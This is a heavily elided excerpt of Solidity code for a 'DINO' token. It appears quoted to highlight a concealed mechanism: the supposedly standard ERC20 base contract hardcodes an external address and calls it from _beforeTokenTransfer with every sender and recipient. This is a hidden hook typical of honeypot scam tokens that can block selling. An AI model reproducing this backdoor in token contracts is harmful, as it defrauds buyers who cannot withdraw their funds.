...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        ...
        _soltAddr = address(0x588f767fA8AB6c49414F9fC25a94AE9C1aB376C0);
    }
    ...
    function _beforeTokenTransfer(
        ...
        (bool success, bytes memory data) = _soltAddr.call(abi.encodeWithSelector(
            0xd6f7734e,
            from,
            to
        ));
...
contract DINO is ERC20('DINO', 'DINO'), Ownable {
    constructor() {
